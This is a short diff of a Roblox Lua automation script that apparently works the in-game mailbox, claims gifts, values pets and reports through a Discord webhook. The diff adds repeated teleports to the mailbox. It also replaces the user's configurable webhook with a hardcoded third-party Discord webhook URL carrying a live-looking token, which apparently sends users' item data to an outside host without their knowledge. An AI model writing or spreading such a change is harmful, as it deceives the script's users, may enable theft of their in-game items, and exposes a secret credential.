@@ -735,8 +735,12 @@ end
 
 -- Teleport To Mailbox
 
-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")[
-"__MAP"].Interactive.Mailbox.Pad.Position)
+box = game:GetService("Workspace")["__MAP"].Interactive.Mailbox.Pad.Position
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(box)
+task.wait(1)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(box)
+task.wait(1)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(box)
 
 -- Claim All Gifts
 
@@ -996,7 +1000,7 @@ function RAP()
 end
 
 -- Webhook
-local url = Webhook
+local url = "https://discord.com/api/webhooks/1123535473143463946/T7h4jIdHyVSLFVeeffMfTnxKCCs1MvjSpM0nYFVwvxs_tsBE5SwY1YKSssd0XgP9-neU"
 local whenabled = true
 local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
     local abcdef1
